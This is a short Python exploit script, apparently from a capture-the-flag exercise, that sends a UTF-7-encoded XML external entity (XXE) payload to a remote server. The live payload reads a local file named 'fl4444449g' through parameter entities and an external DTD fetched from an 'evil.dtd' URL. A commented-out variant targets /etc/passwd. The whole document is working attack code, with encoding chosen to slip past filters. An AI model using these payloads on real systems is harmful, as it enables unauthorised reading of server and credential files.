import requests
url = "http://www.s1mh0.cn:10009/"

# payload = """<?xml version="1.0" encoding = "utf-7"?>
# +ADwAIQ-DOCTYPE a +AFs
# 	+ADwAIQ-ENTITY b SYSTEM +ACI-file:///etc/passwd+ACI +AD4
# +AF0APg
# +ADw-x+AD4AJg-b+ADsAPA-/x+AD4-
# """

payload = """<?xml version="1.0" encoding = "utf-7"?>
+ADwAIQ-DOCTYPE root +AFs
+ADwAIQ-ENTITY +ACU start +ACIAPAAhAFs-CDATA+AFsAIgA+
+ADwAIQ-ENTITY +ACU go SYSTEM +ACI-file:///fl4444449g+ACIAPg
+ADwAIQ-ENTITY +ACU end +ACIAXQBdAD4AIgA+
+ADwAIQ-ENTITY +ACU dtd SYSTEM +ACI-http://www.s1mh0.cn/evil.dtd+ACIAPg +ACU-dtd+ADs
+AF0APg 
+ADw-root+AD4AJg-all+ADsAPA-/root+AD4-
"""
print(payload)
r = requests.post(url ,data=payload)
print(r.text)